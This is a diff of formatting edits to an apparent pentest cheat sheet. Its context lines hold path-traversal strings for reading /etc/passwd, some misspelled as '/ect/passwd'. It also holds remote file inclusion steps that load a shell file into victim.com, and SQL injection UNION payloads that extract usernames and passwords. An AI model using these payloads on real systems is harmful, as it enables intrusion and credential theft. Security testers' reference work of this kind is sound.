@@ -16,6 +16,7 @@ Test Blind DNS: | <code> nslookup (you need a public facing system to see nslook
 > **File Inclusion**
 
 **Test Strings:**
+
 Linux Test String 1 | <code> file%3a%2f%2f%2fetc%2fpasswd </code>
 Linux Test String 2 | <code> /ect/passwd </code>
 Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
@@ -68,7 +69,7 @@ exploit
 4.  python -m SimpleHTTPServer 8080
 5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
-LFI Shell:
+**LFI Shell:**
 * [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
 * [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
 
@@ -85,7 +86,7 @@ LFI Shell:
 ' ` " ; /* --
 {% endhighlight %}
 
-Blind Test Strings:
+Blind Test Strings:<br>
 *Try the following to see if it provides valid results for text that was interpreted:*
 
 Commenting out the end | <code> Dent' ;# <br> Dent' ;-- </code>
@@ -102,15 +103,15 @@ PostgreSQL | 5-digit Hex Error Code
 
 > **SQL Injection Union**
 
-1. Once you have identified SQL injection, use order by (increase until it breaks):
+Once you have identified SQL injection, use order by (increase until it breaks):
 {% highlight sql %}
 dent' and 'a'='a' ORDER BY 5; #
 {% endhighlight %}
-2. See which numbers are visable in the output. 
+ See which numbers are visable in the output. 
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', '4'; #
 {% endhighlight %}
-3. From the visable numbers select one for the union. *Note: It requires the same number of columns and compatable data type*
+From the visable numbers select one for the union. <br> *Note: It requires the same number of columns and compatable data type*
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
 jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
